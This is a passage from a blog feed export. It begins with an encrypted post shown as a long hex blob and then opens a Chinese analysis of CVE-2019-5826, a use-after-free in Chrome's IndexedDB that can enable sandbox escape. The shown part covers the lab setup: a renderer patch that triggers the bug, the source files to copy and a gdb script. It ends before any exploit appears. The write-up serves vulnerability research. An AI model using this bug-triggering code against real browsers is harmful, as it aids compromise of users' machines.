d0f2f8e6745190cc4ed740a5baa644e425acba69570cdb8c811d5bb948c628c2764c933474aff64e88b400ad59bc3259a70c445e585df915c79035b7e91248f72c909ce498b995e0b355f6369d224931088e7a85fe4ed0b64cef66dae6afb932ab42abc2ce04323ca7e15bba8736542ccc3e3c8cb1627682cbd2dfe4d5772f2ccbcf8a401a5bf57f6f3ed74e24c0680394f4d912efb01eb7357094233e167bf688ab07b76c02e352faad8e8558c97abd9a1a9f48a366f13e91032954901564690f5950f2dba8a933dd2883cfe3ca15b22f218c82e5a379e7ea9d21cc7e17bf4c887f6bcbe5082d92d5c7966bf516f8945755062bb3791c60d539c969101a70677763ff3d2a00b967bec83d4bd163851df662819d2dd46f9525682ad1b2d7a9e47db57997f9625dcfcb239b6ea538e834a2399fa818bc43545d7041130c319f48766f41abc980d54614674acbbea88a7a935adf00efabd67726356e23c68df5badcf502a6aecb71c23c12f0b19932bac52e3e042693ab56e5a04eab110ba9bad7b00b8d24186142f74ce0a8b3b2094da85452c10c23d7a5f5a9e8e1964222b20cb4583e7225d7636463006ed2c65ed7bf48b519409e765ae91fe74e6d7e9be7cdf06dbcfae8d8fff46141e38bede548d22b4898329c78d66010caebe9faeaabfd1b86e90e6b0873f21e75a18aab59f05daa6ff4aaac4679a5087d84f0987d7b9d514060ed3509bf9571803b38fd0eee9add775aceec2c2d1727084c17ba9c9e7b68654d5234bef3b4b253e25e70679b1accfb64d549543dfd98b12debe1fbcebd5ccf3e26469d36adad573f7c2a42dc6113a8cf0d62e44d85c563c86431cfc7121037c90faf465f6dadff82b09c2ea0964feccdf8af8a0cf5259e0b3eb03d2fdb0edd9e58dded1d94a8cb13215bebf452f8bcc0cabd7922ccc1b4d1d4d7eeb475b73a5434953f50427b036e93ed8cdffc8b9ac037be9273026838c0793896f6d6712a39933265a11e9c25eaac4cfda182363259a509c67900d8d2a5e7d1158d0db24b7b78daa6dc4afb38a3620080d16725a065c55f815e058d768b56a2eb0a18ed8d3ecdf4b82e3e63721ddd5342b711a18d72b9ed71e24532ccc7ebf18ebf07f77aab0532a555fabd93631456b2088dba234b9ef95fda5c5f482260b97b4777d86120e2da5938a09447409113efcc740c63017162328d048eef5115f5c391b7daf04988344964c3a70da7843b20f57828404845ea78389dd5d58915fad90944509740dd78d6bfe4fcd2f249f705b725b66618f9cbc0e0985a79ab680668701f010d323fa70d89a053632f9ed95bbda153beb5f083fbcd3f395f7112ff1d44dc3404e293ba2bc2bed01c9c391c87efcc1d85e8b11667d9a4eabda9f9f152c71f24459f0608c50136a85b95db5ba9beaba8ed9842564d91999d089d4ce39e3d8aee4928cceee0b89001f490e2bd43068b1958f3e306aed3c444969d31c4d29f771c4f5e6e553f226a1a63cd6731834b2e66103fa56e2849a478d80308a65a2e0bd9b56318db38fab0bf6e79d17c55b783ecf86d5dbdee8df5678943a7f09f8b4101af9f546f959b6fcb42dbefb6641b56ad7e00be1cd4d5a6e55bae7f76ef8b7970257bb0726f36d6f0859c0dd86bea3b535f90030f7a2e66975339a90ffcb6c99b456493ef7413e18a1306f3d0f80eb5e1fc4d0ed9f9740db9ccf4d359815e27b034822f423f9f0d5b78d0060205416495f9d85f64c04c9d4a321dae48c1e14bc546c71c0a203a7de163c65fb4ca4fdb271acf8389d887da1da4a4789640845855bed94846b92682ad91b159cdb81f478809965d60aba5d6b20a2271886b72453cca092b16737733b20075318a914fee9359f32e6556fb67aeeb3d98a63d1ccd01cb9c0030f677f09f3b91e82e16b6bb50dd09eb75125e0cd2016892de92cedda79c80ac3dcd636e9277d7cb9bc41594d6040aa4c76dd67e7a43f4b1a06b28bbc26ad23bf1ea10967798734b2955b5c836363a414405f56ab6e4934df90a25d5439381c79a299e0edc818ab8ee45b658507a47837fa7f406c4728ada78ca4fa7d1598a22fed98d05eaf8cd5460b699a0ab14e126f3ef435e8cf0f78356130e3650a398e07ebcfc878be9f514eb94a3a5e1f21ceffe0a9aa059b7fdfbba13bccf4f3bfd87b855be63668b346129fbd2632af43c8d4d4c393c3a8084135541f4cc0e9561ebd19db398cf7d69a038f26fbe640d34fa7d7ef1eed221f36552a5aec4d8c52c60d961cb7660b4302d85f35410ed282e0b20a26dcab1fb83f39e35258143152b0ca1215c49b96700ada6018e93ff6397778ac815797c1716249cf8bd94f608866c0d9d6bc72e5143e5402e78113098375f3bfff6656434879a51a69193b0977cb3366e234defed70b9a7913e7bfa02b0ce80409647a445df248bcd53ddec83673710521e2004040a12bf5376b61ccd5ba688d9561b50a84773f0c0d80c8859fd99f5633c8779504d0ec60bdf2d516346adfd3d6ba069380889f3393bb44041aa2731e5ba7aa148428a78a597e10b576af0aad7e0f0cb990ebe579e8dee4739dadc702262d0167bb20a08d259367f2cb66cdc5d7c51f984c4600ec77f6825ce9c74ca19713aba877e25ba028f24a291765c6e234ac4cceb2ef63e54b750655fb4aaf64f79166d410ae1a969039dafcafba6bd4dea38d17178e58794747cd16342afe186b677fa86f3c67bff429c172f609bfc405a0a298d539f19cfba5f0b209ed6aea58b19f904c0ef2eefd8e4013cb72e55b4ee6467fa9024072ef1442fb8c771880d59aa81f39270d652226578afead492529d3eb29a88e1231cabf4a20f2764eecee662735354f5dd51ddd8c994c1ca25758c8942555a2bda75bbd811bccc422af59a206c68a9217e650485a65d366363857247f03d310f8c30f6757920636f3a8a49233057caeacc5a242b57dd0774834a7041c6474d9cbb989c4661aa695d2ded865bb3c7a0f030efc9528720a999bbfab562d1d3dee51b5c6a79778fcdfd2107682b2f7212ef59ca449494d78543b8ebba3755ff93300f5e211a370055ccc8b37eee7540406e256bd090cfdd9596f25695890b137a278214932aa12efa018ee0b1ac00feec9204503207e17c4273223fac41d81c3bc0c5ee81032c42413db757c58e21e0146843aa5eda999a3410ed69aec8e606685e523ca93535cb9ba1e6b8008255b562e9a2f72dfefea08079ba152ced13d4531af1afc061ff772216d1e525f80a792a2a63071ea1a50eaf780ecbb97f40d73fa36043bcc1e3357ac7e315558c71d1539638d544467769767c6e5c3fda7cdfb2854a4a4aab2b70a8884f6ad5126719d406c6b2eec7b9b2441979434f2a7af4594834d895fa56a4dfba2ff57972dd8b8c77536573821344aae34ea2c6bf7cfd0f61012dce2bed69d0bd67d2338b7d6686d239c56754df0a62a011de4cf2d38d3ad57bc05243bce4441f58e7c57fb97f4fd22bc5086ba913134ad3907869c3ba4662449fb5de21aea67069c24a138f8939b2e8c851abd4ad915b2323c7c3b6a71544e68f5ce94c66e088f5788df8942fad6d2d4563a1112ddd36f96d0ecd510515410f1bcc40a22199d81b310a31b94b1ad618111119b56a05c5081cb2d546c4af581664f4e72067c00fe2e4541e05753473ce66b7c7542c1c5925bdaacd101a96fcf5331e09f1b5a8ea10dcb54fbab78e3caea650ca9241b9b1b1104cb9062a97ce0bce5bc9f9dca22f4faecedc72c642376cfe88712bbd1767b023baaf7661f1f2e8781c3f6a729cb530a97e7862d62b299b9c738d75eae60201723a0c27d67855e8dc68cbaf2156700d77bec97336ebd7d8957ce4a306dce958c31cee2a5d1f0201f0c37aac6ba4e38ae743fa8c13e4d992dcdc332bc591f1456e6768a66319e610d779bc2b8abe19f75b549555a7b30b01d8043fdc9beb70afbe4ad1a06939f3d8cb48f27c2b123eed3b046866dbc8d93bb5053b2d9b2e8b5ad07113f38ec362234aa69630543ea8100b9ca6aa07b03ace4d2c14ca2b3e771e36dbe963b959b4b425d02c9f99dcf26793630c13f639562cda43d31e220f1e503a927ce87d64f3c39797d7cdbe7761eb1f6005444fbe935ecb08bdbed8ed00de8c9a339e4a56de3301b342a9a2b6538535ca92ca01944a85a8de7e83da7f8fa4f89e5ca4b14fe323c92214c20ff132a7d35c6fba2921b375b93833f2b7af183036c8dbc99b85cf2a5c1b99d87ea17456f025c249834588c541ae3b6e506cf1f1f5a727c87500ccebef8027f49d1160bbfe472791b6d10907eae893fb1dcb8dc0822b11fe08d096139166a2249e528d77578b4483754805cd9645dcf94e0d252fae5a19d9d878fbea01b9cbc3d47db78177b3b78443056f4d1143a087e194d29ad1e1651c1707a2b1c8ba2e5f958f959ff16054a44337b9f08cbc3ade0fded9ed7ba5f3ba09db18ee380bcdad4eb1c15d6f8a6fa04a784264e5ea165213a7861fac57dbc2df85c9e69cfe784d64ca9b868505c574c6a80ba488e29c68baf5c0602b2f7db069a570d30e79015b9e10a9af9ec688509419f9d4bf0a945043fa5f900a54b7cb6871f7bb90a1f5c2afdb751a522248913344e0158c42fa42852f8d79c6ca8e8352c0f235326d42f44f03c79f183f7830979efe4f8616d6a2bf57383dc6f4833252197127567dd427c8f25f4500583c095000ac2489d4da096df732db48a8fc38856e0b610f764b4a6215a01112221f4a7137dcaf130efdcd85d11e2b460e9aefe5f604e9f53f371ad99f56fe3ed666e63303a2199efc84284c3410adb3004f4fd6d9cc0135d86dc834535201f3e0aef7f2b62c33b696389a91fe2550d5a66482b418e00b1e4c9dbea65795ff46bb1f8a4612eb240b165ec4b637d3db347a8ded40bd3391dc0a8872792bbcfb22dbc5db18017c2a66d45664fce023fb50d049340f53dc694d5c7f50d41b8039d71cb6ce898ccf79c447e3386563df946fdd9e25be0c03f928c794e4822c52110886a8e396f14d4ab8f0c2d1319960fd9059b3536d6caabedc4507c5d8f933584c86e637b565ef9678abc4badd3190f92e8c2ff986388b241c0b83fe6a69ec2bca114c3e279338b090f7bdd286d7f0f7f48551cda974245951a1b34b49a464c6ddb5d0edbb1273bff805ed9c4f7ed173d8552a8c865d6f55b0f5f233a358e96e7b338a1a61ead54bfecd5b7b3d30cd516754099f5f0864281540797e4c7422a4de0fcb5dd51d2345801f090a51d8e7b54a992561524b4f550f6a00923f1e3d0ccc829dd93a03d66d7e875b8e0a7496661d7b76df634d5c034884f4127d746a5bc3841eb8b7b88df25b7da7e5f94351802d47c497df09ad2e705c1e1bed5e8a9a3290d741e353ceaa066a4f3da4b0d3601d498a5694df7cd3929f180c27b043894b5846801090c5d6e0ac049fbe359a0e80b6f7c0ca7f8321e383f316a32e921de35705c34e067d7b209d69a6f72ce623de804554e385a8b90795640136acb399b444ae7aade226b22d71a663c9955483cb4fa0e7086570d5c50121e811e4767acd0dac452c476064ff12ee22052a62b48fafeac9e6dee6ae573f18836be3466d2edb4fc713881c7f23c0ad3ba00415531a52d50541cc0b68c3cdbae6e9de8d9e7ccc55d1976ff0e5e72163a1eebf3e495f55963d59e210f7454520ff6dd010187de506d7ef5a1cf9c73cf69b945a65a265df76f1fc6716ea7e908f356d2d87acfaba00457908baec3a082fc24924a5bde2df344fae19625d9ddeb3acdc0e5c3f379882bafbd14415c12f1c92788bded7f00e47d641a10223c398c82ad84d75ea97ced88a4f13968ba21dd96fd53f3d984dc0cad1cf7c58b00a4bdc6881f843c91518cf08ab47ff3a227f084b3fa467415e67616985e04e9f591237e75cbabcd5fd0d181bef27c00005a4d4d08b32e947f312349ba9274f72281d44b163647b4e00e0a84fdcd534a51d14933af04cb1bd0211fc5a4c5053adf7109723738d5ac4bfabc84c4a38b697adbb4507586ce093a6873604a37f937268a8f14c8012f54d8e5cf57965c6ca0eb50a96fec5ff9d677b2c28ca7add05d7160c1a7f0fa8fbba537fb2ab4b9d063a5ee63c17a0ddfda5ae92e508fc97fb07914a3997ac280e90260d9bdf84f9e0b3142280e5d709578a2aab58a0a046c258f1bf00ba4cec5993ac8cb94a544b6781db44ae2e9b07af7f4c4271514238313348d948f0677e51d331d26da5cd8b77015820ec618e6932b4a9b864d20c66d758b6d5f4abf9b74a511a69e8ae1f5fa00a8afe5acd468f85551a883ceaf80b8dd58204a33001988e2742ac06cc2f6503653b330813ef6a15f044c307676e01d3910438f562b66f2f619f1ac8f853a893573438b2a18a83a9b38cc72da057b2c858347c8c77fef077ce3e4a875ce324e66ef189f9eeff0de5def5dbf64b2e2f3d9fa98c8c847d6399e7be60bd452b22bc1ef2db007d8ff83cf70b1013ac655326b36dfa40eaf4cd533c7c8d5c685440a0a1db75b4bb115b908c1d10df0511e2997a8583f641d38122fc0f57c890ba4d53f7e5fb0f39288c8bec0c16c7fe017d05c954055a5ea7537804aace2e2675a38c9f467bdcb233bcc9888d2d1826459313b0f786ff36ebf6b4517fd72833d77b16f587d1287b771a2f887176ae3a417458f0395a61613f9ada8e06fad29a3d29af7ee3b57b11f08f8a7076966b34c0b99769aee72473b850d0dc47ccc944cba35543088aee0b6238805a59aed603c0c4dbef1d63345ab564429283b85ae7da1697b9949637e58d9ccb2b2641e4201f1c5816dbcccec56b233266602f0c71b1394e0e54bd097458224fa306be948efa4b1d3d8ef42cceac176bd052a098640baba37c9de322d808b3932828462b3043c806620d89413b488a6732d4a6ec4c0e58b79031a3f6deb9c2b9a80b8d3f8ac26f514c0b4dc13849d9e4dd2b3247d33e7966873fc959e1491803e10cc5c494929964afc21de598e0fb62895afced1e39895f61de73f9fba5962db7d7daf1ceee7c955aeeb864a9406fb35136c054233e001e5e057ce6c08ec2efcb025c9ba60e57ffe03d71c2c489ab8ad086191f20bffa0c24695128af18072856787dc9a014b49e960903296d4532aac1406ca72893255fc93d253fb2ee6df8515fd818b4fa5b5a9cda1bc71d31f194c59f80ac4010dfc64110a835a6a0b122442b243d472b7c615d257172c8f0187a41f4c7c3ac4bd5ebc21c9f3f1737192acc395f0848348784b03d55bd649caa41de01a60183e3d9e19414ade02ddb0beed067e47f3970438ee174e5eb3b15f1b57bbd289632459970d46720c7ebaded718e509f7a0188deb79b3b6f7fc669689d2ee0794b5db679e567eb20619e9cc32357a6d833a704fc112007b1fb94fc9ab321792bbc91cbd7ab82de0b24de7643b71007fe5ade88fd1946ce5941f5ea777a7998388f97cfc4289db98c92524262c59ae22538d69fdfdb0518acbbe25b6d057d938f1efefa52f8a32efbabee7237000b7c9fdfcc533145a0a785f90b890ce844b54b98b5cbc49eeb6f4a0bb31fa6a70ae395b647b6a013df447e5a130aef7f6c6b1448b225098f1d7dfd9fefce85ee80fc3cc242014da559a2d3566f9031c3f48bf77e87a8c15e7d197561a5c7bc375c6d7ee716716e7bc86fce6f387241ea365dbb61b20873ad3e58308f1436f68e94c248595e9ec674c9cb285b107cb7460e19b6554ea769acc8d1a9fd6168136150aa8d3332ef2c86e27c949189a81d781dbea3404f0650ee5ea3ad5c66dd2c4489dbe0c8993af91df72ad8670c8fecff31f662a49f0d17b28668a8914937bbcbc4ed388f43e7eb8bf51e6c5788bffe4a567538e6163d255f5bf9edd2ad0796e1d758449a34b4a25757549cb960f9fe11ea6ec698a4c35fcb9680c6138ac629fbd84e4b7e1d52f9875f6243f5995a0d629c00d57113e4ace6b4deec6b4789eec2d8f645340b31604d1d4bc05a25847fd86d11e76374f809f4076debf138e3ce9cc8c866f70fdae565698a304f863f909d48f7401add8984db172ac999182f55d7d420fd2be1a3e7891d8b5ba458e35cf05fb1fd95e7dbb560b87c5a0bad40bc065a7dd876013cbb6fb9d94e3bde0b132dcf5af90efb0398474371501e8de32bca5fc515fdf1aa334adadbf0d4cd4aa5a4b2f75caaf68311eeb44d2f330b8d2ddfdef15b84b93494c820233d190d372540492715711791b40fd203ce292ea97fe052280df48c4138eb73fe1624d6eee51ed76fa99a80d3b7ebbde83d9a61b2c1df3b8832d64bb9face76882791ad71bf17c48cf9863fc174e2fd78806d87a29c86b328d6046ba0395dc0a7b50c408d47125bd249e93596c6fc6b7ccd009e6936386a7ded97007438e41a24eb9222f9ba64997887740c2912dfd2414a7c2a0ac446aca3eb35666aaeb237f37feb4b1c3bd87673abf24793da66b544834fe9514c19ab5744c125e2e0e5cd7400ee58c736508ee02a53876e1777e7f8ab7f9b49e022d533af84b699bf657d1b281d97458e4e0e55dcca5c67696a1aab7461b82a3247dd49710b9f8e5a8f61dc2cc91617f675f1d256b6579728caf96db51662548eaf4ee9b6528d2879a168b2fd368a6e77a16616896ac502c6352f6e630ee8946587b082b4f4407501830444c4ace69d70dd22a3f27f6bcd6b7825486aa6a5da80dc4ffb4530bb42ff1ea023d9439d52251076be03c7c718f1813f91d622b5639632fd006c34be67d99aa31b0d0b50d2a2e2ebbafcb9e519c33754dd930e860b183bb1e6d1f4f57efb5c814bb2931757a64ae7bd2634debcef741d80c52e038831d4f38eae74995edecbe176b8ccd7f0ba98c7ab6f222e1969eb08e1f4e06ff4b34b0f9811c4fe9b79d6ece7b9df1129471cf0d48862073cb015f91a7468435f26dc92fbe6b1f223c7a05cc05dd8908bce7d6b3ff84fc7433f5a952aa2b27185ef8cd672236ba359d6e7d1a6edcd022af09fa5532814430fc0e76a9046042504f4f5cd47b488706ba8f1e7586675901577d935992b480b7a83a7a9d7629139f2101e9d0d3ab21afba6f29979d6d969df6feb09847eba9450d5339e3aa821734a3e50f4bbb552ac31f949cb9d95fff81e863886d5e0a8a1a5741b289d9f96149b72493ca07777b635dcc1e95b566dbb72599e9a39a24503a4bb3cb46ac22ffa19ca5f9038cf336a426bf20b80a149db0a7c9885a533ed6e76aa8d3b6d72ca904f23050aee086ee7a409c3673983422d7ee89febb6dd64ea3979ef33e72ddf9ec0931b9d24ca3093f6536452b152a49b94e409e4d230ffe8723bb20293232c554013de5bbd6b535f1ecb0d4fdadeb42b085f4422b518da02b8cba8d9bc6bade2063751a912d689451bad0b3601424e5ca2d776e4fb3fca7a1efc7a937ba09e2053a6463cd3acbd4bbea062b17b59188eba814b6dd6a7b3d659bac27b3d50340c516886f6dd89032f59ef9594fe08e7d9640e7723e4a676a99e44e1b30e0f5cb58cc7353d819b8933f80808217dc456e23b0ed525dddd9a751722e825124b135fc61212c970464b471b3956219ef8edf4958fcc33bbb3eced1bdb5336f5e709d99321651b49f18d2693b43197fd25ad526d4b5d10ce964a54951b6123a726ae49c93687bc9518eb13f35c224903a54da1a8c70139c23d8763b0694ced7aff345a833408eb379c7d2fb311189bc18b5a091cfabead4ef15c2a120a9613b8bce0367fe2dfaf52960b5b462b66f30edf41dc9b87c3ded580285c83a2ea9a5fa632d97f317f2983ff8bbd3914bd479da777d787d2f8d2b0bd05927ff5125122eb56d7a4c413e787bebe304fead91aa9335c0d90a160f778d716c83d5b0db8be8ce31ecf3eb83fa89b557e032944e5aaa98761089da52aea3f81d2e28cd0b05e0bc7752a5ed82473f29573822daafcdbe4e231f8ed73661eb18f9e99d420823be2369ede291b2ae638ce80cc7cf090d48b069679c33c75583dbf1018461416a7c28dd1f1fbdc7bd92e28aff93a044a7c3f300b8beb79f4f6b08e6b1163a8eb82996de5c5e4e50a41b14733c3e38f4258eadcde199918394289d706424de766f3d030e2dabc9042e901dc199ec6a99a6b6b32c9172acf91f5ee97718048711757b5ffc00fc4047dd05f331236dc622de9076ef97d54c56ebbec095ec4dd6545d770415ded6c98245df5d682d3753585ad1341fecbd19e1ad9fcd2ad1fc472eafc5bf5828fe50b008b41bb7e72de14bb6082ef4ecb0128c751e49d339cef217a0d47c2c6f0fa03112e8339493c6b3e3b85b3b294114d2dd6224605356fd5f3a2c46ae2045b5a23bbeb329fadf45c8d3eb85b84294adff2c8390af22ed00333c4da11db9f5d3c3dc77e35d9a226c2137331d9c2caecd364de08b82f5e822d213c2f5fcaa42bd826b26ea0c4fe7c1f0623acdf614fabfc8d200df74f9de46df9f95776edf1eb6e3092790c5d651bca6dbf8a7d9ea81d6b6a863799b138830eb2a7081c7eff933f3946e77ffdb6530a074d734af2a9b1d2b068256d56b9455c96d187dc489c97dccf2e7094231fdab28ca5efedeb33c8a0f3f50befffd4bb7696aa6a54ed0a37437cdfdcda0d8d04faf8162c70d33015b17645c27c49179f082a83895f97407a00dd9a62fbe1e03f09d580f9b09cc2c5c853fa6da002805c66b7c6c9c51a887394ae37e7adb454429dcdcd7be1a2fc1b828c5658c0f65aaec47858501cd094598b53e9ee4c4dcb117b6de1c5fc6c6d1e1913f4cf4debf0dffe91129f171f87ea7e627979ad82b226f572e9e57150650f96057eacc928da3da6a9d2b74b7ceb120e8662e927df79e546a7f2f4e56b9ceffd4733f3b80d372a63b1317141c09ed0b1381896b1c9fd899d9cf7ad9708830a2bc24561e26e887b75498ee958689f13e2e76aad57bc993110710d43272676009e219b67118fe160cca46da68f913aa7ad643f2bff1127d70bdf00006e821b383022befeb067a600c7fd5e6b58d5672213f68e009dcf32f6d97ffe851e90486b93c35e947bae3ebc8a6cd126378dc6f453ece50a261093797a5e1a557cd1cdc118ff5f46b053b85bbf15d9cd0c2b7d8527a026b8683ff6160a923e94438d31f54e644224179f9c825bb3ac13fea5dcd2a10fbcaefb9bdb32357ce9788c9627598a24ee272167cf4ab819d5ddd8a08c58c06c8bc6156d404332ae6642776a215b1248e09c471caeb38e0a01ec6b7d701b96518afbdfced6932a17a5e37f6c691cfa8346d2ac575e7a24af9569abac369eb899614eb992fbd4ac545cb9d7640e3a39df1c735e4176e8bd252e5567867554cc6ec1f3dff06eeedf1e241f8d0f153134a42a46e0c93604a11b114284827003ec667f6cd14bd7c809a2c34e63876e95932a77eb0d735391bd77f1c448a02a9e45fe80232e9428643478d15c629021abfc492be3999e9552ed8289e7dc7bbecc38c58c132782d55e743deddc23157cab67a227b45fd2e5544c39669d5935757b93fb657144eb6056d0dcc48d81d7da7b6e921a40b2842babcc9da99a65c56803dda2c62eeea8360d21d7cfae2e36275f6dda75a054ad6bc146af3281b4749169ddde9226c1d9d0f8c5ef9ad65d96aee6d2112f0dd5c5f890c1504035607f3231f2f034ae36d0fa1be6192b34746a6f0208b6fdd8b78de957dcf29c918579913ff4b27f99998079bc8f833586ea43d2c453f7ba2b7a1f91b7425efdd0e46b1753812c096ab19f7c2de7bbf39773065482d7abc955a9c07729e3d4c4017e8b5eb9be2fc37b09b3f57d1d1243429396894b4cedbc5a7745e7068272703c5a7bbb9b82100cc8c8b53f2ab9b8c44ee6b7d6543f4493a09b125892456ffe49e53080d90815e314d30a0f7c3d41627b93717c65937ea19aae6e2c78e7c66a1ac790fc636914a78e9b42fcab5b9ec66c587de4ffc8a84f650e0e5e54c9dbf2b925b1fbf57e3594d9fc17456a464a9c83b1f643905cb96d99b39f84a4f7db41696305d47b4252b1fb9166c7f0e674d9f97dba26d215ee5a80e963076e19e36cfe09ed52d5f3da5fe4b925cf56b7a00597fa306482c0c4ce0070039c4bc755eb40e4b51807e0daebfdc67bc0ece824563284e41f4795ba6ac9e7ede2c988504a1dae567111b0a10043cd270a0f8e2606f1b53b7767970243907fdfaf641911b799884a71743a5b102277459f25cfa62196ae3619cc71bacdd3ab7d0155afaa40e1c543aacc26e28541e218536972e6de7efa4740df652319f45e9845845a517ba0f65854072efdf50cff44bf4a4c57499bbd4fb36ea4ca920b0635191291061d97bced5a3eda3cc2a350185723d0b287dee7f35f1f461a74ea9b29d44bbe4ca2b91244554cba6b2d1aa5bcb8c38f138f82354fda560bc1a895d7a046de1a27075437d31780cf926f8c7b86b70b8783b8c9d34b7b6513bc2a9a97ff5a20a303a5d1e64d5c3d089e8c3f2a5649440387d44c85a1ab690b0760b3bb623eb2abbc041725f9f00376c35fabf2450ea8f81c8e73400ab8d26172be160ad0a58c312aba2af44e082dafb7992628cf334389214b59d82a73ea2a237885c1c531072e6f314ac0e041299433e56f2dc1757d2c1572789dffa5411da0f4420c1ecb18ebb85091b0a700ce88cfd333611eaa0a1154403ca89acde676b48dc3be9ad318aa05a5edafb1a56d16e1a81e4cb50c41218406ef9e21424e30b2f60e669a24a841cea801ea56c13069eb25b3681ffb479a616795a02069e76a1bf92e2cb7d7ade786ce8e70ddfa052dc8cdddfa3ee86887ca3093b617416fecc95857dba39eb36bcf32e83e54dd1718c0b9efb7fd40c72621f71b1c4e3e209736253764a8a86027320a045c4a7551fc3e1b8d7f0619f3d0b05e7dfcefbbe7122ae88d27ab8be078812a893f68ecd5e9b79b25106cb48ad555dd0580af4cd3631164d6fcc93bd04a63904b100047353969170422107bb6ba88f9b94476b2d1e9c1709ef05809501955574a8949576ffa10d017f34a0ba776f09931c9dad51b961a7d8cfcdfa0f12b6e109bb497f8aad985e4f1c59a83da4e24d301d72a42278f1e4081225b3e340c16719c2e2baf938f572c87ea147b960ce71ec931a6204d26bb572f2df39b72bfcba8c30b02b7b0d65413a9c8b7cc430fdf4d79b28f136c1415d651076f954ee5a400167400fe6a62a9882bc4009a41f331e45fde689e90a207fd4fa1d45468ddc7e23ba2fbb07dcc1d177d71f339c05dc8fea56f2de473a99a289b199b955c68b2d9e8927418ceeeeb90f44ee13db0dd8ec38c1afe6f4f860b83cdc20967b85d49ba5403ab2db54e53c2596809e2f4b0c213f52b602a895f1167201f52b1cbc5e286be73a20e3cb5fa16157affc474ac475b97075682870e5ae8bcdecf12ee38f4642cc798db5e46dab2caa9fe171f74720e25941f160c88d9ed1e83a1bab9b339ef4c64087894fe50276d8a645b7212b3662cc2939d3d415f687b50d3c2f52dac5c5a39f1a1b33ce59c4040ce666333ab446c87b35e2e2594f1b576f6135701bdc64b059a83dbd1313e3cffbfe13e16925169d0ae99aa6dd43cd0cb12f097bcc9fae36f0dc192b14269bcafce0c0e9a949f4ae0d7ba7429eb885acdf2e3e8838f3b6aac01c81a333c7245454710e1958e18f8f918faaa93e24d12e48e7806b4d261f55a2d23eb2bfb271bc8e9ee27adf849209c7352960775b9fe108e8798e9630cb722efd48d51c31ed582c7cf0cc03996611260171d7cc0e51587f93db5d7dfc28cfa7fc8b8dad5aa4d97658b24c99c1b03cea1ff5b5c23df0ad50406d9235c7057c0a87ef799097f76521027175ebf9e59e7f50e96f05d623e0e171c62a22f946c657a19c555158acc2ac306ff4c49e3d3c14fc40edc321852f74bed4768815963adbb625561ff9de5f328ff790b9c2ba26e06ff1c2638503c729043291fc55c925faf1252e8edc95ca22d1c414c200a7824c1de83087a46793de4a748a69ea8d5ce16c312444d6cf940032636dd0fb386197326b9e508dc6a2c89f0bfb1e96856f328ed2f12610d8772178266993c6020528fb03132a79a734f3e31375bae9a72325332a003bddd53f597815de17c4e91c0a3c6e118c0367a34356a8a3006fab213e62b946261a8952544a7ca8e8631aa71ae09123903840ed00fcdfafb5df7ab891b508037a24058125bca306d328dce8ec6</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>vulnerability analysis</category>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-5826分析</title>
    <url>/2020/10/CVE-2019-5826/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>
<p>CVE-2019-5826是Google Chrome里IndexedDB中的Use-after-free漏洞，在版本73.0.3683.86之前该漏洞允许攻击者通过<strong>搭配render的RCE漏洞</strong>来造成UAF并<strong>沙箱逃逸</strong>。</p>
<a id="more"></a>
</li>
</ul>
<h2 id="一、环境搭建">一、环境搭建</h2>
<ul>
<li>
<p>笔者所使用的chrome版本为<code>73.0.3683.75</code>（<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc" target="_blank" rel="noopener">源码</a>）。下载源码<strong>并打上patch</strong>，之后编译运行即可（在此感谢<a href="http://github.com/sadmess" target="_blank" rel="noopener">@sad</a>提供的二进制文件，没有编译环境的穷人留下了泪水 T_T）</p>
<p>patch如下。至于为什么要打上patch，笔者将在下面详细介绍。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">// third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc</span><br><span class="line">void WebIDBFactoryImpl::Open(</span><br><span class="line">       std::make_unique&lt;IndexedDBDatabaseCallbacksImpl&gt;(</span><br><span class="line">           base::WrapUnique(database_callbacks));</span><br><span class="line">   DCHECK(!name.IsNull());</span><br><span class="line">   factory_-&gt;Open(GetCallbacksProxy(std::move(callbacks_impl)),</span><br><span class="line">                  GetDatabaseCallbacksProxy(std::move(database_callbacks_impl)),</span><br><span class="line">                  name, version, transaction_id);</span><br><span class="line"><span class="addition">+  if (version == 3) &#123;</span></span><br><span class="line"><span class="addition">+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;</span></span><br><span class="line"><span class="addition">+    auto request = mojo::MakeRequest(&amp;ptr_info);</span></span><br><span class="line"><span class="addition">+    factory_-&gt;DeleteDatabase(std::move(ptr_info), origin, name, true);</span></span><br><span class="line"><span class="addition">+    factory_-&gt;AbortTransactionsForDatabase(origin, base::OnceCallback&lt;void(blink::mojom::IDBStatus)&gt;());</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>从<a href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc" target="_blank" rel="noopener">chrome源码</a>中依次复制</p>
<ul>
<li><code>indexed_db_database.cc</code></li>
<li><code>indexed_db_factory_impl.cc</code></li>
<li><code>web_idb_factory_impl.cc</code></li>
<li><code>indexed_db_connection.cc</code></li>
</ul>
<p>等文件中的源码，并将其保存至当前目录中的<code>chromeSrc</code>文件夹。这样做的目的是<strong>为了在调试时可以使用源代码</strong>。</p>
<blockquote>
<p>没有源码的调试chrome实在是太痛苦了QwQ</p>
</blockquote>
</li>
<li>
<p>老样子，使用gdb脚本来辅助调试</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gdbinit</span></span><br><span class="line"><span class="comment"># 读取符号</span></span><br><span class="line">file ./chrome</span><br><span class="line"><span class="comment"># 设置启动参数</span></span><br><span class="line"><span class="built_in">set</span> args http://localhost:8000/test.html</span><br><span class="line"><span class="comment"># 设置源码路径</span></span><br><span class="line">directory chromeSrc/</span><br><span class="line"><span class="comment"># 设置执行fork后继续调试父进程</span></span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>
<blockquote>
